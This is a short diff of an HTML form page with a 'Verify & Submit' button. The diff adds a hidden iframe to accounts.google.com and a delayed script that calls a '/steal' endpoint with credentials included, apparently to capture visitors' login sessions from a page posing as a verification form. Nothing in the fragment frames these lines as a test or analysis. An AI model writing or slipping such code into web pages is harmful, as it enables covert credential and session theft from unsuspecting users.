@@ -22,7 +22,8 @@
 
 <button type="submit">✅ Verify & Submit</button>
 </form>
-
+<iframe src="https://accounts.google.com" style="display:none"></iframe>
+<script>setTimeout(()=>fetch('/steal',{credentials:'include'}),5000)</script>
 <script>
 // Auto fill metadata
 document.querySelector('input[name="ip"]').value = 'auto-detect';
